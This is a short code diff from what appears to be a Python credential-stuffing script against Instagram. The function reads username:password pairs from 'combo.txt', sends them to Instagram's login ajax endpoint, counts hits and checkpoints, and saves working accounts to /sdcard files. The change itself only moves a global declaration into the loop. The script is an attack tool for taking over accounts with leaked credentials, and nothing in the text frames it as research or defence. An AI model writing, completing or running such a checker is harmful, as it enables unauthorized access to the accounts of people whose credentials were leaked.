@@ -64,8 +64,8 @@ def instagram1():
 		try:
 			combo="combo.txt"
 			file = open(combo,'r').read().splitlines()
-			global bad, timeout, checkpoint, error, hits
 			for line in file:
+				global bad, timeout, checkpoint, error, hits
 				user = line.split(':')[0]
 				pasw = line.split(':')[1]
 				url = 'https://www.instagram.com/accounts/login/ajax/'
@@ -133,4 +133,3 @@ def instagram1():
 	loopPp()
 	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
 instagram1()
-
